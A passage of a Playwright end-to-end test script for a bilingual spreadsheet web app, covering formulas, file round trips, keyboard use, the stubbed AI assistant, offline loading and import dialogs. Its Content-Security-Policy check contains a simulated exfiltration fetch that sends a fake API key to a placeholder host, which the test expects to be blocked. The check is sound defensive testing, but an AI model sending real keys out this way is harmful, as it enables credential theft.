// Copyright 2026 Suruch Chakrapeesirisuk
// SPDX-License-Identifier: Apache-2.0

/**
 * The end-to-end gate: the app driven the way a person drives it.
 *
 * 1,088 unit tests cover the functions. Not one of them opens the app. Every bug this project found
 * the hard way lived in the wiring *between* well-tested pieces, where a unit test cannot look:
 *
 * - The toolbar's "+ row" button called `addRow`, which never announced anything, while the tested
 *   `insertRowAtSelection` beside it did. Both functions passed their tests.
 * - The AI assistant sent the range including its text header, because the context builder read
 *   `sheet.cells` (raw `=C2*D2`) instead of the computed display values. Both modules passed.
 * - A new toolbar button pushed the language toggle 42px off the right edge at 1360px.
 *
 * Every one of those was found by a person clicking. This file is that person, in CI.
 *
 * Deliberately the same shape as `check-a11y.mjs` — a plain script that starts the production
 * server, drives Chromium and prints ok/FAIL — rather than `@playwright/test`. The test runner
 * would bring parallelism, retries and traces, and it would also bring a second test runner, a
 * config file and a dependency, for a suite this size. One entry point (`npm run verify`) is worth
 * more here than fixtures are.
 *
 * Flows are chosen by one rule: **would a unit test already catch it?** If yes it does not belong
 * here. What is left is the seams — store to grid to engine and back, a real file leaving the app
 * and coming back in, the keyboard, and whether anything is said out loud.
 */
import { browserEnv } from "./browserEnv.mjs";
import { spawn } from "node:child_process";
import { createServer } from "node:http";
import { readdirSync, readFileSync } from "node:fs";
import { mkdtemp, readFile, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { setTimeout as delay } from "node:timers/promises";
import { chromium } from "playwright";

const PORT = Number(process.env.E2E_PORT || 3124);
const ORIGIN = `http://localhost:${PORT}`;

/**
 * A company API on another port, for the browser-source flows (#110). `/stock` answers CORS for the
 * app's origin, wants `Authorization: Bearer e2e-secret`, and moves a number on every call so a
 * refresh can be seen; `/nocors` answers the same data with no CORS header at all.
 */
const API_PORT = Number(process.env.E2E_API_PORT || 4725);
/** `E2E_ONLY=<part of a name>` runs the matching flows only, for the edit loop. The gate runs them all. */
const only = process.env.E2E_ONLY;
const API = `http://127.0.0.1:${API_PORT}`;
const API_SECRET = "Bearer e2e-secret";
let apiCalls = 0;
const stubApi = createServer((req, res) => {
  const url = new URL(req.url, API);
  const body = () => JSON.stringify({ data: [{ sku: "RICE-5KG", qty: 100 + apiCalls }, { sku: "OIL-1L", qty: 40 }] });
  if (url.pathname === "/nocors") {
    res.setHeader("content-type", "application/json");
    res.end(body());
    return;
  }
  res.setHeader("access-control-allow-origin", ORIGIN);
  res.setHeader("access-control-allow-headers", "authorization");
  if (req.method === "OPTIONS") {
    res.statusCode = 204;
    res.end();
    return;
  }
  if (req.headers.authorization !== API_SECRET) {
    res.statusCode = 401;
    res.end("{}");
    return;
  }
  apiCalls++;
  res.setHeader("content-type", "application/json");
  res.end(body());
});
stubApi.listen(API_PORT);

/** The connect-src a visitor who never added a source is served, exactly. */
const BASE_CONNECT_SRC = "connect-src 'self' https://api.anthropic.com";
const connectSrcOf = (header) => header.split(";").map((d) => d.trim()).find((d) => d.startsWith("connect-src")) ?? "";

/** Every visible label exists in both languages, and the default depends on what is in storage. */
const label = {
  formulas: /^(สูตร|Formulas)$/,
  pointingKeys: /^(ปุ่มสำหรับพิมพ์สูตร|Formula keys)$/,
  pointingDone: /^(เสร็จ|Done)$/,
  pickRange: /^(เลือกช่วงจากตาราง|Pick a range from the table)$/,
  useHere: /^(ใช้แท็บนี้แทน|Use this tab instead)$/,
  exportExcel: /^(ส่งออก Excel|Export Excel)$/,
  importFile: /^(นำเข้าไฟล์|Import file)$/,
  addRow: /^(แถว|Row)$/,
  addSheet: /^(เพิ่มชีตใหม่|Add a new sheet)$/,
  formulaBar: /^(พิมพ์ค่าหรือสูตร|Type a value or formula)/,
  liveData: /^(ข้อมูลสด|Live data)$/,
  connectYourApi: /^(ต่อ API ของคุณ|Connect your API)$/,
  allowAndTest: /^(อนุญาตและทดสอบ|Allow and test)$/,
  test: /^(ทดสอบ|Test)$/,
  saveAndAdd: /^(บันทึกและใส่ลงตาราง|Save and add to the sheet)$/,
  wholeTable: /^(ตารางทั้งหมด|Whole table)/,
  insert: /^(ใส่ลงตาราง|Insert)$/,
  copyForIt: /^(คัดลอกไปส่ง IT|Copy for IT)$/,
  trySales: /^(ลองต่อ|Try it): (ยอดขายสด|Live sales)$/,
  enterSecret: /^(ใส่ค่า header|Enter the header value)$/,
  exportPdf: /^(ส่งออก PDF|Export PDF)$/,
  sortAsc: /^(เรียงจากน้อยไปมาก|Sort ascending)/,
  menu: /^(เมนู|Menu)$/,
  connectApi: /^(ต่อ API \/ ฐานข้อมูล|Connect an API \/ database)/,
  tools: /^(เครื่องมือ|Tools)/,
  cellTools: /^(เครื่องมือเซลล์|Cell tools)$/,
  italic: /^(ตัวเอียง|Italic)$/,
  chart: /^(กราฟ|Chart)$/,
};

const failures = [];
const note = (ok, text, detail) => {
  console.log(`  ${ok ? "ok " : "FAIL"}  ${text}`);
  if (!ok) {
    if (detail !== undefined) console.log(`        ${detail}`);
    failures.push(text);
  }
};

/** Waits for the server to answer, rather than guessing how long a cold start takes. */
async function waitForServer(timeoutMs = 90_000) {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    try {
      const res = await fetch(ORIGIN + "/app");
      if (res.ok) return;
    } catch {
      // Not listening yet.
    }
    await delay(500);
  }
  throw new Error(`server did not answer on ${ORIGIN} within ${timeoutMs}ms`);
}

const cell = (page, row, col) => page.locator(`td[data-row="${row}"][data-col="${col}"]`);

/** How big the current selection is, counted from what the grid marks as selected. */
const selectionSize = (page) =>
  page.evaluate(() => {
    const picked = [...document.querySelectorAll("td[data-row][data-col]")].filter((td) =>
      td.getAttribute("aria-selected") === "true"
    );
    const rows = new Set(picked.map((td) => td.getAttribute("data-row")));
    const cols = new Set(picked.map((td) => td.getAttribute("data-col")));
    return { rows: rows.size, cols: cols.size };
  });

/** Clicks a cell, types, and commits with Enter — the way the grid is actually used. */
async function typeInCell(page, row, col, text) {
  await cell(page, row, col).click();
  await page.keyboard.type(text);
  await page.keyboard.press("Enter");
}

/**
 * The same thing for text the harness cannot type.
 *
 * `keyboard.type` sends real key events for ASCII, which is what makes the helper above a genuine
 * test of "a printable keypress starts an edit". For anything outside it — Thai, in this app, which
 * is most of what anyone types — Playwright falls back to CDP's `insertText`, and that inserts
 * characters without ever firing `keydown`. The grid starts editing from `keydown`, so the
 * keystrokes land nowhere and the cell keeps whatever it had: a test that passes on the old value
 * and proves nothing. Measured, not guessed — it is how the first version of this file "passed".
 *
 * So Thai goes in through F2, which is the other way a person opens a cell, and then into the
 * input, where `insertText` is exactly right.
 */
async function typeThaiInCell(page, row, col, text) {
  await cell(page, row, col).click();
  await page.keyboard.press("F2");
  await cell(page, row, col).locator("input").waitFor({ timeout: 5000 });
  await page.keyboard.insertText(text);
  await page.keyboard.press("Enter");
}

/** A fresh app with nothing carried over from the flow before. */
async function freshPage(browser, width = 1280, touch = false) {
  // Thai, fixed: a first visit takes the browser's language now, and several flows read Thai text.
  const ctx = await browser.newContext({
    viewport: { width, height: 900 },
    acceptDownloads: true,
    locale: "th-TH",
    ...(touch && { hasTouch: true, isMobile: true }),
  });
  const page = await ctx.newPage();
  await page.goto(ORIGIN + "/app", { waitUntil: "networkidle" });
  await page.evaluate(() => window.localStorage.clear());
  await page.reload({ waitUntil: "networkidle" });
  return { ctx, page };
}

const FLOWS = [
  {
    name: "typing a formula recalculates on screen",
    async run(page) {
      await typeInCell(page, 0, 0, "10");
      await typeInCell(page, 1, 0, "20");
      await typeInCell(page, 2, 0, "=SUM(A1:A2)");

      await page.waitForFunction(() => document.querySelector('td[data-row="2"][data-col="0"]')?.innerText.trim() === "30");
      note(true, "=SUM(A1:A2) over 10 and 20 shows 30");

      // The whole point of the dependency graph: an edit upstream moves the cell that reads it.
      await typeInCell(page, 0, 0, "15");
      const after = await cell(page, 2, 0).innerText();
      note(after.trim() === "35", `editing A1 moves the total to 35 (showed "${after.trim()}")`);
    },
  },
  {
    name: "a file leaves the app and comes back the same",
    async run(page, { tmp }) {
      await typeInCell(page, 0, 0, "10");
      await typeInCell(page, 1, 0, "20");
      await typeInCell(page, 2, 0, "=SUM(A1:A2)");
      await typeThaiInCell(page, 0, 1, "ทดสอบ-ก");

      const [download] = await Promise.all([
        page.waitForEvent("download"),
        page.getByRole("button", { name: label.exportExcel }).click(),
      ]);
      const file = join(tmp, "roundtrip.xlsx");
      await download.saveAs(file);
      const bytes = await readFile(file);
      note(bytes.length > 0 && bytes[0] === 0x50, `the export is a real zip container (${bytes.length} bytes)`);

      // Back in through the same file input the import button opens.
      await page.evaluate(() => window.localStorage.clear());
      await page.reload({ waitUntil: "networkidle" });
      await page.locator('input[type="file"]').setInputFiles(file);
      await page.waitForFunction(() => document.querySelector('td[data-row="2"][data-col="0"]')?.innerText.trim() === "30");

      const thai = await cell(page, 0, 1).innerText();
      note(thai.trim() === "ทดสอบ-ก", `Thai text survives the round trip (read back "${thai.trim()}")`);

      // The cell has to come back as a formula, not as the 30 it happened to equal: edit what it
      // reads, and a formula moves while a pasted number does not.
      await typeInCell(page, 0, 0, "1");
      const recomputed = await cell(page, 2, 0).innerText();
      note(recomputed.trim() === "21", `the imported cell is still a formula, not its old value (showed "${recomputed.trim()}")`);
    },
  },
  {
    name: "the grid is usable without a mouse",
    async run(page) {
      // One click to enter the grid, then nothing but the keyboard — the way someone who does not
      // use a pointer works, and the path no unit test covers.
      await cell(page, 0, 0).click();
      await page.keyboard.press("ArrowDown");
      await page.keyboard.press("ArrowDown");
      await page.keyboard.press("ArrowRight");
      await page.keyboard.type("x9");
      await page.keyboard.press("Enter");

      const landed = await cell(page, 2, 1).innerText();
      note(landed.trim() === "x9", `arrow keys then typing lands in B3 (showed "${landed.trim()}")`);

      // Focus follows the moving corner, which is what a screen reader reads out.
      const focused = await page.evaluate(() => {
        const el = document.activeElement;
        return el?.tagName === "TD" ? `${el.getAttribute("data-row")},${el.getAttribute("data-col")}` : el?.tagName;
      });
      note(focused === "3,1", `focus follows the cursor after Enter (activeElement was ${focused})`);

      // The three shortcuts somebody arriving from Excel reaches for without thinking. They are
      // here rather than in a unit test because each is a key event routed through the grid's
      // switch, and the switch is where a duplicate `case` once made a whole branch dead code.
      await cell(page, 1, 1).click();
      await page.keyboard.press("Control+ ");
      const column = await selectionSize(page);
      note(column.rows > 5 && column.cols === 1, `Ctrl+Space takes the whole column (${column.rows}×${column.cols})`);

      await cell(page, 1, 1).click();
      await page.keyboard.press("Shift+ ");
      const row = await selectionSize(page);
      note(row.rows === 1 && row.cols > 3, `Shift+Space takes the whole row (${row.rows}×${row.cols})`);

      // Ctrl+Enter: one cell's content into everything selected, in one step.
      await typeInCell(page, 6, 0, "dup");
      const seeded = (await cell(page, 6, 0).innerText()).trim();
      note(seeded === "dup", `the cell to fill from holds what was typed (A7 showed "${seeded}")`);

      await cell(page, 6, 0).click();
      await page.keyboard.down("Shift");
      for (let i = 0; i < 3; i++) await page.keyboard.press("ArrowDown");
      await page.keyboard.up("Shift");
      await page.keyboard.press("Control+Enter");
      const filled = (await cell(page, 9, 0).innerText()).trim();
      note(filled === "dup", `Ctrl+Enter fills the selection (A10 showed "${filled}")`);
    },
  },
  {
    name: "undo puts back what the last edit changed",
    async run(page) {
      await typeInCell(page, 0, 0, "first");
      await typeInCell(page, 0, 0, "second");
      await page.keyboard.press("Control+z");

      await page.waitForFunction(() => document.querySelector('td[data-row="0"][data-col="0"]')?.innerText.trim() === "first");
      note(true, "Ctrl+Z restores the previous value");
    },
  },
  {
    name: "an edit after undoing a new sheet is kept (#40)",
    async run(page) {
      // Undo takes the new tab away. What is typed next has to land on the tab that is left and
      // survive a reload — it used to go nowhere, with nothing on screen to say so.
      await page.getByTitle(label.addSheet).click();
      await page.keyboard.press("Control+z");
      await page.getByTitle(label.addSheet).waitFor();
      await typeInCell(page, 1, 0, "important");
      const shown = (await cell(page, 1, 0).innerText()).trim();
      note(shown === "important", `A2 shows what was typed after the undo (showed "${shown}")`);

      await page.reload({ waitUntil: "networkidle" });
      await page.waitForFunction(() => document.querySelector('td[data-row="1"][data-col="0"]')?.innerText.trim() === "important", null, {
        timeout: 5000,
      }).then(
        () => note(true, "it is still there after a reload"),
        async () => note(false, "it is still there after a reload", `A2 showed "${(await cell(page, 1, 0).innerText()).trim()}"`)
      );
    },
  },
  {
    name: "a cut on one sheet pasted on another clears the source, not the destination (#41)",
    async run(page) {
      await typeInCell(page, 0, 0, "move-me-1");
      await typeInCell(page, 1, 0, "move-me-2");
      await page.getByTitle(label.addSheet).click();
      await typeInCell(page, 0, 0, "KEEP-A1");
      await typeInCell(page, 0, 1, "KEEP-B1");
      await typeInCell(page, 1, 0, "KEEP-A2");

      // Back to the first sheet, cut A1:A2 with the keyboard, paste at D1 on the second.
      await page.getByText("Sheet1", { exact: true }).click();
      await cell(page, 0, 0).click();
      await cell(page, 1, 0).click({ modifiers: ["Shift"] });
      await page.keyboard.press("Control+x");
      await page.getByText("Sheet2", { exact: true }).click();
      await cell(page, 0, 3).click();
      await page.keyboard.press("Control+v");

      const at = async (r, c) => (await cell(page, r, c).innerText()).trim();
      await page.waitForFunction(() => document.querySelector('td[data-row="0"][data-col="3"]')?.innerText.trim() === "move-me-1", null, {
        timeout: 5000,
      });
      const kept = [await at(0, 0), await at(0, 1), await at(1, 0)];
      note(kept.join() === "KEEP-A1,KEEP-B1,KEEP-A2", `the destination's own cells survive (A1,B1,A2: ${kept.join(", ")})`);
      note((await at(1, 3)) === "move-me-2", "the block lands at D1:D2");

      await page.getByText("Sheet1", { exact: true }).click();
      const source = [await at(0, 0), await at(1, 0)];
      note(source.join() === ",", `the source sheet's A1:A2 is cleared (showed "${source.join('", "')}")`);
    },
  },
  {
    name: "the formula bar shows the cell as it is now, and leaving it writes nothing (#42)",
    async run(page) {
      const bar = page.getByPlaceholder(label.formulaBar);
      const at = async (r, c) => (await cell(page, r, c).innerText()).trim();

      // Delete under the same address: the bar has to follow, and clicking in and out must not
      // put the old value back.
      await typeInCell(page, 0, 0, "hello");
      await cell(page, 0, 0).click();
      await page.keyboard.press("Delete");
      note((await bar.inputValue()) === "", `after Delete the bar is empty (showed "${await bar.inputValue()}")`);
      await bar.click();
      await cell(page, 3, 3).click();
      note((await at(0, 0)) === "", `focusing the bar and leaving it does not bring "hello" back (A1 showed "${await at(0, 0)}")`);

      // Undo under the same address, then Tab out of the bar.
      await typeInCell(page, 1, 0, "v1");
      await typeInCell(page, 1, 0, "v2");
      await cell(page, 1, 0).click();
      await page.keyboard.press("Control+z");
      await page.waitForFunction(() => document.querySelector('td[data-row="1"][data-col="0"]')?.innerText.trim() === "v1");
      note((await bar.inputValue()) === "v1", `after undo the bar shows v1 (showed "${await bar.inputValue()}")`);
      await bar.focus();
      await page.keyboard.press("Tab");
      note((await at(1, 0)) === "v1", `tabbing out of the bar leaves A2 at v1 (showed "${await at(1, 0)}")`);

      // Typing still writes — Thai included, through the input method path the harness has.
      // An empty cell well below the sample, so what lands is only what was typed.
      await cell(page, 14, 1).click();
      await bar.click();
      await page.keyboard.insertText("ยอดขายเดือนนี้");
      await page.keyboard.press("Enter");
      note((await at(14, 1)) === "ยอดขายเดือนนี้", `Thai typed into the bar lands in B15 (showed "${await at(14, 1)}")`);

      // While the cell's own editor is open the bar shows what is typed there, as Excel's does —
      // it showed the saved cell, so its placeholder, while `=SUM(` was typed in the cell. Shown
      // only: Escape still leaves the cell as it was.
      await cell(page, 16, 1).click();
      await page.keyboard.type("=SUM(");
      note((await bar.inputValue()) === "=SUM(", `the bar shows what the cell's editor holds (showed "${await bar.inputValue()}")`);
      await page.keyboard.press("Escape");
      note((await at(16, 1)) === "" && (await bar.inputValue()) === "", `and Escape writes nothing (B17 "${await at(16, 1)}", bar "${await bar.inputValue()}")`);
    },
  },
  {
    name: "the AI assistant puts a working formula in the cell",
    async run(page) {
      // The only part of the app that talks to a server, and the part with the worst record: its
      // unit tests mock the model, so they answer the way whoever wrote them expected. Stubbing
      // the route here tests everything *around* the model — what the panel sends, what it does
      // with the reply, and whether the formula it inserts actually computes — which is where the
      // real failures were.
      let posted = null;
      await page.route("**/api/ai/formula", async (route) => {
        posted = JSON.parse(route.request().postData() || "{}");
        await route.fulfill({
          status: 200,
          contentType: "application/json",
          body: JSON.stringify({ formula: "=SUM(F1:F2)", explanation: "รวมค่าในช่วง F1:F2", source: "claude" }),
        });
      });

      // Column F, because the sample sheet fills A–E for ten rows. Putting the numbers in A meant
      // the run above the cursor was A1:A10, not A1:A2, and the first version of this flow read
      // that as a bug in the app when it was a bug in the fixture.
      await typeInCell(page, 0, 5, "10");
      await typeInCell(page, 1, 5, "20");
      await cell(page, 2, 5).click();

      await page.locator('button[aria-label="ถาม AI"]').first().click();
      const panel = page.locator("aside");
      await panel.locator("textarea").fill("รวมคอลัมน์นี้ให้หน่อย");
      await panel.getByRole("button", { name: "ถาม AI" }).click();
      await panel.locator("code").first().waitFor({ timeout: 10_000 });

      // The range the panel sends is the bug that shipped once: it went out including the text
      // header above the numbers, because the context was built from raw cells instead of values.
      note(posted?.selection === "F1:F2", `it sends the filled run above the cursor (sent ${JSON.stringify(posted?.selection)})`);
      note(posted?.question === "รวมคอลัมน์นี้ให้หน่อย", "the question reaches the route unchanged");

      await panel.getByRole("button", { name: /ใส่สูตรนี้ที่เซลล์/ }).click();
      await page.waitForFunction(() => document.querySelector('td[data-row="2"][data-col="5"]')?.innerText.trim() === "30");
      note(true, "the suggested formula lands in the cell and computes to 30");
    },
  },
  {
    name: "a rate limit is shown, not swallowed",
    async run(page) {
      // 429 is the one error a person can act on, so it has to say how long to wait rather than
      // fall into the generic "could not connect". A silent failure here looks like a broken app.
      await page.route("**/api/ai/formula", (route) =>
        route.fulfill({ status: 429, contentType: "application/json", body: JSON.stringify({ retryAfterSec: 42 }) })
      );

      await page.locator('button[aria-label="ถาม AI"]').first().click();
      const panel = page.locator("aside");
      await panel.locator("textarea").fill("อะไรก็ได้");
      await panel.getByRole("button", { name: "ถาม AI" }).click();

      const said = await panel
        .locator("p", { hasText: "42" })
        .first()
        .innerText()
        .catch(() => "");
      note(said.includes("42"), `it says how long to wait ("${said.trim()}")`);
      note((await panel.locator("code").count()) === 0, "and offers no formula to insert");
    },
  },
  {
    name: "the CSP is on, and it closes the exit that matters",
    async run(page) {
      // The AI assistant holds the visitor's own API key in sessionStorage, which means any script
      // running in this page can read it. The policy cannot stop that; what it can stop is the step
      // after — sending it somewhere. That claim is worth re-checking on every push, because a
      // header is exactly the kind of thing that survives in the config and stops being served.
      const header = (await page.goto(ORIGIN + "/app"))?.headers()["content-security-policy"] ?? "";
      note(header.includes("connect-src"), `/app is served with a connect-src policy (${header.slice(0, 60) || "no header"}…)`);
      note(header.includes("https://api.anthropic.com"), "and the BYOK path is in it, or the assistant would be broken by it");

      // The part that is easy to lose. `script-src` used to carry 'unsafe-inline' because Next
      // hydrates through inline scripts; it now carries a per-request nonce instead, which only
      // works while the page is rendered per request. Someone adding `export const dynamic =
      // "force-static"` — or a future Next that prerenders anyway — would put 'unsafe-inline'
      // back by accident, and nothing else here would notice.
      const scriptSrc = header.split(";").map((d) => d.trim()).find((d) => d.startsWith("script-src")) ?? "";
      note(!scriptSrc.includes("'unsafe-inline'"), `script-src has no 'unsafe-inline' (${scriptSrc || "missing"})`);
      note(scriptSrc.includes("'strict-dynamic'"), "and 'strict-dynamic', so a script injected from our own origin is not simply allowed");
      const first = scriptSrc.match(/'nonce-([^']+)'/)?.[1];
      const second = (await page.goto(ORIGIN + "/app"))?.headers()["content-security-policy"]?.match(/'nonce-([^']+)'/)?.[1];
      note(Boolean(first) && Boolean(second) && first !== second, "with a nonce that is different on the next request");

      const stamped = await page.evaluate(() => {
        const inline = [...document.querySelectorAll("script:not([src])")];
        return { total: inline.length, nonced: inline.filter((s) => s.nonce || s.getAttribute("nonce")).length };
      });
      note(
        stamped.total > 0 && stamped.nonced === stamped.total,
        `and every inline script in the document carries it (${stamped.nonced}/${stamped.total})`
      );

      const refused = await page.evaluate(async () => {
        try {
          await fetch("https://exfiltration.invalid/?k=sk-ant-stolen");
          return false;
        } catch {
          return true;
        }
      });
      note(refused, "a script cannot fetch a stolen key to an origin the policy does not name");

      // A policy the app itself trips over gets switched off by whoever hits it next, so the app
      // running clean under it is as much a part of the check as the blocking is.
      const own = [];
      page.on("console", (m) => {
        if (/Refused to|Content Security Policy/i.test(m.text()) && !m.text().includes("exfiltration.invalid")) {
          own.push(m.text().slice(0, 120));
        }
      });
      await typeInCell(page, 0, 0, "10");
      await typeInCell(page, 1, 0, "20");
      await typeInCell(page, 2, 0, "=SUM(A1:A2)");
      await page.waitForFunction(() => document.querySelector('td[data-row="2"][data-col="0"]')?.innerText.trim() === "30");
      note(own.length === 0, "and the app itself trips over none of it", own.join(" · "));
    },
  },
  {
    name: "the cloud client is built, and never downloaded",
    async run(page) {
      // The README says a deployment with no cloud configured never downloads the ~250KB Supabase
      // client. `check:bundle` proves it sits in a chunk of its own; only a browser can prove that
      // nobody asks for that chunk. The two halves together are the claim.
      //
      // Worth a flow of its own because it is so easy to lose by accident: one static import
      // anywhere in the reachable graph — and the live-editing store is now imported by the grid —
      // folds the library into a chunk the page loads anyway, and nothing else would notice.
      const chunks = join(process.cwd(), ".next", "static", "chunks");
      const cloudChunks = readdirSync(chunks)
        .filter((name) => name.endsWith(".js"))
        .filter((name) => readFileSync(join(chunks, name), "utf8").includes("SupabaseClient"));
      note(cloudChunks.length === 1, `the cloud client is in exactly one chunk (${cloudChunks.length})`);

      const asked = [];
      page.on("response", (r) => {
        const name = r.url().split("/").pop() ?? "";
        if (cloudChunks.includes(name)) asked.push(name);
      });
      await page.goto(ORIGIN + "/app", { waitUntil: "networkidle" });
      await typeInCell(page, 0, 0, "1");
      note(asked.length === 0, "and no page load asks for it", asked.join(" "));
    },
  },
  {
    name: "a build that was not told to count sends nothing",
    async run(page) {
      // The usage counter is off unless `NEXT_PUBLIC_USAGE=1`, and that flag is baked in at build
      // time — which is exactly the kind of claim a unit test cannot make, because it is about
      // what this bundle does rather than what the function would do if called. So: drive the
      // acts that are wired to count, and watch the wire.
      const posts = [];
      page.on("request", (r) => {
        if (r.url().includes("/api/usage")) posts.push(`${r.method()} ${r.url()}`);
      });

      // The landing page first: it counts a view of its own now, and the same flag has to keep
      // that one quiet too.
      await page.goto(ORIGIN + "/", { waitUntil: "networkidle" });
      await page.goto(ORIGIN + "/app", { waitUntil: "networkidle" });
      await typeInCell(page, 0, 0, "1");
      await typeInCell(page, 1, 0, "=A1*2");
      await page.waitForTimeout(400);

      note(posts.length === 0, `nothing is posted to /api/usage (${posts.length})`, posts.join(" "));

      // And the endpoint itself refuses on this build, so a stranger cannot switch it on by
      // finding it. 204 either way, by design — what is asserted is that nothing is recorded, and
      // the route's own tests cover that half.
      const res = await page.request.post(ORIGIN + "/api/usage", { data: { event: "app_opened" } });
      note(res.status() === 204, `the endpoint answers without saying which events exist (${res.status()})`);
    },
  },
  {
    name: "the app opens with the network switched off",
    async run(page) {
      // The pitch has always been that the sheet lives in your browser. It was true, and the app
      // still could not open on a train — the document was local and the program was not. Only a
      // real browser can prove this one: it needs a service worker to install, take control, and
      // then serve a navigation from its cache with the network genuinely gone.
      await page.goto(ORIGIN + "/app", { waitUntil: "networkidle" });
      const state = await page.evaluate(async () => {
        if (!("serviceWorker" in navigator)) return "unsupported";
        const registration = await navigator.serviceWorker.ready.catch(() => null);
        return registration ? "ready" : "failed";
      });
      note(state === "ready", `the service worker registers and takes control (${state})`);

      const manifest = await page.request.get(ORIGIN + "/manifest.webmanifest");
      const body = manifest.ok() ? await manifest.json() : {};
      note(manifest.ok() && body.start_url === "/app", `the manifest is served and starts in the app (${body.start_url})`);
      note((body.icons ?? []).some((i) => i.purpose === "maskable"), "with a maskable icon, so Android does not crop the mark away");

      // Give the worker a moment to finish putting the shell in its cache.
      await page.waitForTimeout(1500);
      await page.context().setOffline(true);
      try {
        const offline = await page.goto(ORIGIN + "/app", { waitUntil: "domcontentloaded" });
        note(Boolean(offline && offline.status() === 200), `the app still loads offline (${offline?.status()})`);
        const cells = await cell(page, 0, 0).count();
        note(cells === 1, "and the grid is there, not an error page");
      } finally {
        await page.context().setOffline(false);
      }
    },
  },
  {
    name: "a change away from the cursor is announced",
    async run(page) {
      // This flow exists because of a bug exactly here: the toolbar's "+ row" called `addRow`,
      // which said nothing, while the keyboard path beside it announced correctly. Both had tests.
      await cell(page, 0, 0).click();
      await page.getByRole("button", { name: label.addRow }).click();

      const said = await page
        .waitForFunction(() => {
          const text = [...document.querySelectorAll('[role="status"]')].map((n) => n.textContent?.trim()).find(Boolean);
          return text || null;
        }, null, { timeout: 5000 })
        .then((handle) => handle.jsonValue())
        .catch(() => "");

      note(Boolean(said), `adding a row says something out loud ("${said}")`);
    },
  },
  {
    name: "a save the browser refuses is said out loud, and export still works",
    async run(page) {
      // This flow exists because of a bug exactly here: PaynEat ERP's large import template needed
      // ~45M characters of storage, every save threw QuotaExceededError, the throw escaped from the
      // Export action too, and a reload then lost the work with no warning at all. A unit test can
      // fake the storage; only a browser can show the throw reaching a click handler.
      await page.evaluate(() => {
        const original = Storage.prototype.setItem;
        Storage.prototype.setItem = function (key, value) {
          if (key === "exceltogo-sheet-v2" && window.__refuseSave !== false) {
            throw new DOMException("Setting the value exceeded the quota.", "QuotaExceededError");
          }
          return original.call(this, key, value);
        };
      });
      const errors = [];
      page.on("pageerror", (err) => errors.push(err.message));

      await typeInCell(page, 0, 0, "too big to keep");
      // Filtered by what it says: Next.js keeps a `role="alert"` route announcer on every page.
      const alert = page.getByRole("alert").filter({ has: page.getByRole("button", { name: label.exportExcel }) });
      const shown = await alert.waitFor({ timeout: 5000 }).then(() => true, () => false);
      note(shown, "the refused save shows an alert");
      const text = shown ? (await alert.innerText()).trim() : "";
      note(/ส่งออก Excel|Export Excel/.test(text), `the alert says what to do about it ("${text.slice(0, 60)}…")`);

      const [download] = await Promise.all([
        page.waitForEvent("download", { timeout: 15_000 }),
        alert.getByRole("button", { name: label.exportExcel }).click(),
      ]);
      const saved = await download.path();
      const bytes = saved ? await readFile(saved) : Buffer.alloc(0);
      note(bytes.length > 0 && bytes[0] === 0x50, `export from the alert still downloads a real file (${bytes.length} bytes)`);
      note(errors.length === 0, `no uncaught page errors while saves were refused${errors.length ? ` — ${errors[0]}` : ""}`);

      await page.evaluate(() => (window.__refuseSave = false));
      await typeInCell(page, 0, 1, "fits again");
      const gone = await alert.waitFor({ state: "detached", timeout: 5000 }).then(() => true, () => false);
      note(gone, "the alert goes away once a save lands again");
    },
  },
  {
    // The blind test's worst moment: someone opened a file to look something up and lost an hour of
    // typing, because an import replaced the workbook without a word. The store tests cover what
    // "append" builds; this asks the seam — does the file input actually stop and ask, does the
    // choice the dialog puts under the cursor keep the work, and does undo take the file back out.
    name: "opening a file on top of work asks first, and keeping both keeps both",
    async run(page) {
      // G3: outside the sample's table, whose header row is already drawn heavier.
      await typeInCell(page, 2, 6, "keep-me");
      await page.keyboard.press("ArrowUp");
      const weightOf = () => cell(page, 2, 6).evaluate((td) => getComputedStyle(td.querySelector("span") ?? td).fontWeight);
      const before = await weightOf();
      await page.keyboard.press("Control+b");
      const weight = await weightOf();
      note(Number(weight) === 700 && Number(before) < 700, `Ctrl+B makes the cell bold without opening it (font-weight ${before} → ${weight})`);

      await page.locator('input[type="file"]').setInputFiles({
        name: "incoming.csv",
        mimeType: "text/csv",
        buffer: Buffer.from("incoming,1\n"),
      });
      const dialog = page.getByRole("dialog", { name: /^(เปิดไฟล์นี้อย่างไร|How should this file open\?)$/ });
      await dialog.waitFor({ timeout: 5000 });
      note(true, "the file waits for a choice instead of replacing the workbook");

      // Enter takes whatever has focus, which is what someone who does not read the dialog does.
      await page.keyboard.press("Enter");
      await page.waitForFunction(() => document.querySelector('td[data-row="0"][data-col="0"]')?.innerText.trim() === "incoming");
      await page.getByText("Sheet1", { exact: true }).first().click();
      const kept = (await cell(page, 2, 6).innerText()).trim();
      note(kept === "keep-me", `the default choice keeps the work in its own tab (G3 showed "${kept}")`);

      await page.getByRole("status").getByRole("button", { name: /^(ย้อนกลับ|Undo)$/ }).click();
      const tabs = await page.getByText("incoming", { exact: true }).count();
      note(tabs === 0, `undo on the notice takes the file's sheet back out (${tabs} left)`);
    },
  },
  {
    // The app opens blank, and the sample is one press away. What only a browser can say: the
    // sample an older version autosaved into localStorage is not brought back on the next visit,
    // while one changed cell makes it somebody's work that is. And "New file" over that work asks,
    // with exporting first under the cursor, and the undo shortcut brings the work back.
    name: "a visit opens blank, a saved sample is not restored, and New file asks and undoes",
    async run(page) {
      const text = async (r, c) => (await cell(page, r, c).innerText()).trim();
      const openSample = page.getByRole("button", { name: "ลองกับข้อมูลตัวอย่าง", exact: true });
      note((await text(0, 0)) === "" && (await openSample.isVisible()), "a first visit is an empty sheet with the sample on offer");

      await openSample.click();
      await page.waitForFunction(() => document.querySelector('td[data-row="0"][data-col="0"]')?.innerText.trim() !== "");
      note((await text(0, 0)) !== "", `the button opens the sample (A1 "${await text(0, 0)}")`);

      await page.waitForTimeout(300);
      await page.reload({ waitUntil: "networkidle" });
      note((await text(0, 0)) === "", "the untouched sample, autosaved, opens blank on the next visit");

      await openSample.click();
      await typeInCell(page, 1, 2, "70");
      await page.waitForTimeout(300);
      await page.reload({ waitUntil: "networkidle" });
      note((await text(1, 2)) === "70", `one changed cell makes it work that is kept (C2 "${await text(1, 2)}")`);

      await page.getByRole("button", { name: "ไฟล์ใหม่", exact: true }).click();
      const dialog = page.getByRole("dialog", { name: "เริ่มไฟล์ใหม่?" });
      await dialog.waitFor({ timeout: 5000 });
